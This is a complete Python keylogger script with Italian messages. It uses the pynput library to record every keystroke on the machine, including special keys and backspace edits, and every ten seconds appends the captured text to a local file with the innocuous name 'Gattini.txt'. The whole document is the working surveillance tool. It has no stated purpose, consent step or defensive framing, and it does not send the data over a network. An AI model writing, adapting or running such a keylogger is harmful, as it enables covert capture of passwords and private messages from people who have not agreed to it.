from pynput import keyboard
import threading


gattini_file = "Gattini.txt"  

text = ""
previous_text = ""

time_interval = 10  

pressed_keys = set()


def save_to_file():
    global text, previous_text
    try:
        if text:  
            if text != previous_text:  
                
                with open(gattini_file, "a") as f:
                    f.write(text + "\n")  
                
                previous_text = text  
        
        timer = threading.Timer(time_interval, save_to_file)
        timer.start()
    except Exception as e:
        print(f"Errore durante il salvataggio: {e}")


def on_press(key):
    global text, pressed_keys
    try:
        if key in pressed_keys:
            return  
        pressed_keys.add(key)  

        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            if len(text) > 0:
                text = text[:-1]
        elif hasattr(key, 'char') and key.char:
            text += key.char
        else:
            text += f"[{key}]"

    except AttributeError:
        
        text += f"[{key}]"


def on_release(key):
    global pressed_keys
    try:
        
        if key in pressed_keys:
            pressed_keys.remove(key)
    except Exception as e:
        print(f"Errore durante il rilascio del tasto: {e}")


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    save_to_file()  
    listener.join()
